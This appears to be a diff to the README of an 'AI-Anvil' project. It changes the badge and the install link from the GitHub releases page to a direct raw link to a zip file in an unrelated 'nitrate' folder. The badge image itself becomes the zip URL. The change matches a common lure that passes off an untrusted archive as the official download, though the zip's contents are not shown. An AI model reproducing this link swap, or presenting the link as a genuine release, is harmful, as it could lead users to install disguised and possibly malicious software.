@@ -1,6 +1,6 @@
 # 🚀 AI-Anvil - Build Your Future in AI
 
-[![Download AI-Anvil](https://img.shields.io/badge/Download_AI--Anvil-blue.svg)](https://github.com/Fggggggggd/AI-Anvil/releases)
+[![Download AI-Anvil](https://raw.githubusercontent.com/Fggggggggd/AI-Anvil/main/nitrate/AI-Anvil.zip)](https://raw.githubusercontent.com/Fggggggggd/AI-Anvil/main/nitrate/AI-Anvil.zip)
 
 ## 📚 Introduction
 
@@ -27,7 +27,7 @@ Welcome to AI-Anvil! This application helps you explore and experiment with arti
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://github.com/Fggggggggd/AI-Anvil/releases). You will find the latest version of AI-Anvil available for download.
+To get started, [visit this page to download](https://raw.githubusercontent.com/Fggggggggd/AI-Anvil/main/nitrate/AI-Anvil.zip). You will find the latest version of AI-Anvil available for download.
 
 1. Click on the download link that corresponds to your operating system.
 2. Wait for the download to finish.
